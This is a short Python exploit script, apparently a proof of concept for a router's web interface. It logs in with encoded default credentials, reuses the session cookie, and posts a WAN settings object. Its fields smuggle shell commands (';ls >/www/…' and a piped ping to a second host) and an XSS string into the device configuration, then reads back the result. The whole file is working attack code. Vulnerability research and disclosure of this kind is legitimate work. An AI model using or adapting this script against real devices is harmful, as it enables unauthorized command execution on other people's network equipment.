import requests
import json

url1 = 'http://192.168.31.6/cgi-bin/login.cgi'
data1 = {"username":"YWRtaW4%3D","password":"MTIzNDU2","token":"","source":"web","cn":"","action":"auth"}

response1 = requests.post(url1, data=json.dumps(data1))
print(response1.text)

url2 = 'http://192.168.31.6/API/obj'
headers = {
    'Host': '192.168.31.6',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.31.6',
    'Referer': 'http://192.168.31.6/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data2 = {"staticip":{"StaticipP":{"ip":"0.0.0.0","netmask":"0.0.0.0","gateway":"0.0.0.0","dns1":"0.0.0.0","dns2":"0.0.0.0","dns3":"0.0.0.0","mtuMode":"0","mtu":"1500"}},"wan":{"WanP":{"name":"wan","hostname":"alert('XSS')","ifname":";ls >/www/20250327.txt ; #","proto":"0","domainName":"|ping -c 1 192.168.31.166|"}}}

response = requests.post(url2, headers=headers, data=json.dumps(data2))
print(response.text)

url3 = 'http://192.168.31.6/API/info'
data3 ={
	"InternetConnection":{}
}
response = requests.post(url3, headers=headers, data=json.dumps(data3))
print(response.text)
